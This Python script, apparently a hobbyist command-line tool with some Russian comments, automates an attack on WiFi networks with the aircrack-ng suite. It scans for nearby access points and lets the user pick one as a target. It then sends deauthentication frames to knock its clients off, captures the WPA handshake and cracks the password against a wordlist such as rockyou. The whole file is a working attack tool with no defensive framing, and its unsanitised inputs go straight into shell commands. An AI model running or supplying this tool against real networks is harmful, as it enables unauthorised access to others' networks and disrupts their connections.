import os
import time
import csv

print("=" * 60)
print("       WIFI AUTOMATED HANDSHAKE & CRACK TOOL (CLI)      ")
print("=" * 60)

desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Автоматический выбор wlan0 по умолчанию
interface = input("copy & paste your interface (default: wlan0): ").strip()
if not interface:
    interface = "wlan0"

print("\nkilling network processes")
os.system("sudo airmon-ng check kill")
time.sleep(1)

print(f"activating monitor mode on {interface}")
os.system(f"sudo airmon-ng start {interface}")
time.sleep(2)

monitor_interface = interface if interface.endswith("mon") else f"{interface}mon"

print("\n" + "=" * 60)
print("scanning networks for 15 seconds")
print("=" * 60)

scan_output = os.path.join(desktop_path, "tmp_scan")
os.system(f"sudo timeout 15 airodump-ng -w {scan_output} --output-format csv {monitor_interface} > /dev/null 2>&1")

networks = []
csv_file = f"{scan_output}-01.csv"

if os.path.exists(csv_file):
    with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
        reader = csv.reader(f)
        for row in reader:
            if len(row) >= 14 and row[13].strip() and row[0].strip():
                mac = row[0].strip()
                ch = row[3].strip()
                name = row[13].strip()
                if [name, mac, ch] not in networks and ":" in mac:
                    networks.append([name, mac, ch])

os.system(f"rm -f {desktop_path}/tmp_scan*")

if not networks:
    print("\nno active networks found. try running again.")
    exit()

print("\nactive networks found:")
print("-" * 60)
for index, net in enumerate(networks):
    print(f"{index}. {net[0]}") # Вывод строго в формате: 0. Aziza23
print("-" * 60)

selection = input("\nchoose network number (e.g., use 0): ").strip()
if "use " in selection:
    net_idx = int(selection.replace("use ", ""))
else:
    net_idx = int(selection)

wifi_name = networks[net_idx][0]
bssid = networks[net_idx][1]
channel = networks[net_idx][2]

file_name = input("\nenter name for handshake file (press enter for 'WpaH'): ").strip()
if not file_name:
    file_name = "WpaH"

print(f"\ntarget selected -> {wifi_name}")
print("starting capture and sending deauth attack")
time.sleep(2)

os.system(f"sudo aireplay-ng -0 5 -a {bssid} {monitor_interface} > /dev/null 2>&1 &")

custom_hack_path = os.path.join(desktop_path, file_name)
# Запуск ловушки
os.system(f"sudo airodump-ng -c {channel} --bssid {bssid} -w {custom_hack_path} {monitor_interface}")

print("\n" + "=" * 60)
print("starting cracking phase")
print("=" * 60)

# Автоматически находим созданный .cap файл на Рабочем столе
cap_file = os.path.join(desktop_path, f"{file_name}-01.cap")

print("\nwordlist examples:")
print(f" - {os.path.join(desktop_path, 'rockyou_combo.txt')}")
print(" - /usr/share/wordlists/rockyou.txt")

wordlist = input("\nenter path to your wordlist file: ").strip()

print("\nstarting aircrack-ng")
time.sleep(2)

crack_cmd = f"aircrack-ng -w {wordlist} -b {bssid} {cap_file}"
os.system(crack_cmd)
